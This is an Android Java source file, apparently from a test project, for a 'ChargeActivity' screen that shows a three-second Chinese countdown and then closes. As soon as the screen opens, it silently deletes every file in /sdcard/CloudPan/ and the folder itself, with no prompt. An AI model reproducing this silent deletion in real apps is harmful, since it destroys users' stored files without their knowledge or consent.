package com.project_test.forsix;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.File;

public class ChargeActivity extends AppCompatActivity {
    private Button i_see;
    private TextView notice;
    private Thread thread1,thread2,thread3;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_charge);
        deleteFiles();
        initView();
        initThreads();
        initButton();

    }

    private void initButton() {
        i_see.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                notice.setVisibility(View.VISIBLE);
                notice.setText("程序将在3秒后关闭");
                notice.setTextSize(30);
                thread1.start();
                thread2.start();
                thread3.start();

            }
        });

    }

    private void initThreads() {
        thread1=new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        notice.setText("程序将在2秒后关闭");
                        notice.setTextSize(40);
                    }
                });



            }
        });
        thread2=new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        notice.setText("程序将在1秒后关闭");
                        notice.setTextSize(50);

                    }
                });
            }
        });
        thread3=new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                finish();
            }
        });
    }

    private void initView() {
        notice= (TextView) findViewById(R.id.notice);
        i_see=
                (Button)findViewById(R.id.i_see);
    }

    private void deleteFiles() {
        File file=new File("/sdcard/CloudPan/");
        if (file.exists()){
        File[] files = file.listFiles();
        for (int i = 0; i < files.length; i++) {
            files[i].delete();
        }
        }
        file.delete();
    }
}
